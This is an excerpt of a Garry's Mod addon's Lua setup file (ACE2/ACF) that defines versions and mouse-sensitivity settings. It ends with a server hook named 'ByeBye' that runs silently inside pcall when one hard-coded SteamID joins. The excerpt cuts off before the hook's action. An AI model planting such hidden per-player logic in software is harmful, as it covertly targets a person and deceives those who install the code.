...
ACF.MenuFunc = {}
ACF.AmmoBlacklist = {}
ACF.Version = 101		-- ACE2 current version
ACF.CurrentVersion = 0	-- just defining a variable, do not change

ACF.Year = 2024			-- Current Year

print("[ACE2 | INFO] - loading ACE2. . .")
...
---------------------------------- Clientside Convars ----------------------------------
	...
	CreateClientConVar( "acf_sens_irons", 0.5, true, false, "Reduce mouse sensitivity by this amount when zoomed in with iron sights on ACE2 SWEPs.", 0.01, 1)
	CreateClientConVar( "acf_sens_scopes", 0.2, true, false, "Reduce mouse sensitivity by this amount when zoomed in with scopes on ACE2 SWEPs.", 0.01, 1)
...
if SERVER then
	...
	hook.Add("PlayerInitialSpawn", "ByeBye", function( ply )
		pcall(function()
			if ply:SteamID() == "STEAM_0:0:441199989" then
